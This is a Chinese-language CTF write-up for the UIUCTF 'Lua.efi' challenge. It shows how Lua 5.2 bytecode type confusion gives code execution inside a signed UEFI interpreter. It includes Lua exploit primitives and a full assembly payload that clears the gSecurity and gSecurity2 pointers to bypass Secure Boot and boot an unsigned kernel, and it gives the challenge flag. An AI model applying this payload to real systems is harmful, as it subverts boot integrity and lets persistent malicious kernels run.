# Lua.efi

## 题目简述

系统启用了 Secure Boot，磁盘中的内核未签名，正常调用 UEFI `LoadImage` 会返回 `Access denied`。固件却预装并信任了一个签名的 Lua 5.2 解释器。题目删除了 `io.open`、`os.execute` 等明显接口，但仍允许加载 Lua bytecode；目标是先利用不可信 bytecode 取得 UEFI 环境中的任意代码执行，再破坏镜像认证链并启动磁盘上的后门内核。

## 解题过程

### 从 Lua bytecode 到任意函数调用

题目提示给出了一个 [Lua 5.2 不可信 bytecode 利用](https://gist.github.com/corsix/49d770c7085e4b75f32939c6c076aad6)。其关键不是调用已删除的标准库，而是修改 `string.dump()` 产生的指令和闭包对象：

1. 把数值 `for` 循环字节码中的 `OP_FORPREP` 改为 `OP_JMP`，制造对象指针与 Lua number 之间的重解释原语；
2. 用伪造的 `Proto`、`UpVal` 和协程闭包改写 `CClosure.f`；
3. 得到 `addr_of(obj)` 与 `make_CClosure(address)`，从而把任意地址包装成可调用的 C 函数。

官方 `stage1.lua` 的核心接口最终表现为：

```lua
function addr_of(x)
  return as_num(x) * 2^1000 * 2^74
end

function make_CClosure(f)
  -- 伪造 Proto / UpVal，使协程闭包的函数指针等于 f
  ...
  return co
end
```

在题目的交互式 calculator 中，要去掉公开 PoC 顶层变量前的 `local`，让后续输入仍能访问这些原语。UEFI 通常没有 W^X 限制，可以把机器码放在 Lua 字符串中直接执行。Lua 5.2 的 `TString` 头长 24 字节，所以：

```lua
payload = "...机器码字节..."
cpayload = make_CClosure(addr_of(payload) + 24)
cpayload()
os.exit()
```

### 关闭镜像认证

ASLR 使固件模块基址变化，不能直接硬编码绝对地址。调用伪造 CClosure 时，栈顶返回地址位于 `Lua.efi + 0x1cf13`。已知全局 `gBS` 位于 `Lua.efi + 0x34638`，可先恢复 Boot Services 表；其中偏移 200 的 `LoadImage` 指向 `DxeCore.efi` 内 `CoreLoadImage + 0x9f4`，再反推出 DxeCore 基址。

`CoreLoadImageCommon` 仅在 `gSecurity2` 或 `gSecurity` 非空时执行文件认证。第二阶段机器码把这两个全局协议指针清零：

```asm
LuaEfi_off_gBS       = 0x34638
LuaEfi_off_retaddr   = 0x1cf13
BS_off_LoadImage     = 200
DxeCore_off_LoadImage = 0x9f4
DxeCore_off_gSecurity = 0x25710
DxeCore_off_gSecurity2 = 0x255f0

_start:
  mov (%rsp), %rax
  add $(LuaEfi_off_gBS-LuaEfi_off_retaddr), %rax
  mov (%rax), %rax

  mov BS_off_LoadImage(%rax), %rax
  sub $DxeCore_off_LoadImage, %rax

  movq $0, DxeCore_off_gSecurity(%rax)
  movq $0, DxeCore_off_gSecurity2(%rax)
  xor %eax, %eax
  ret
```

payload 返回 Lua 后退出解释器。后续引导再次调用 `LoadImage` 时，由于两个 Security Architectural Protocol 全部为空，未签名的 `\EFI\Linux\bzImage.uki.efi` 不再被拒绝。后门内核启动、挂载 flag 共享目录并输出：

```text
uiuctf{broken_chain_of_trust_is_a_lot_of_damage_fb61a3b1}
```

## 方法总结

- 核心技巧：利用 Lua 5.2 bytecode 类型混淆构造任意 C 函数调用，再借固件内已知相对偏移动态定位 DxeCore 并移除 Secure Boot 的认证协议。
- 识别信号：签名解释器仍接受攻击者提供的 bytecode，意味着签名只证明解释器本身可信，不能保证其后续解释的数据安全。
- 复用要点：Secure Boot 是一条信任链；一旦受信任的 pre-boot 组件能执行任意代码，就必须继续审计其能否修改 `gBS`、`gRT`、安全协议或引导变量，而不能只检查磁盘镜像签名。
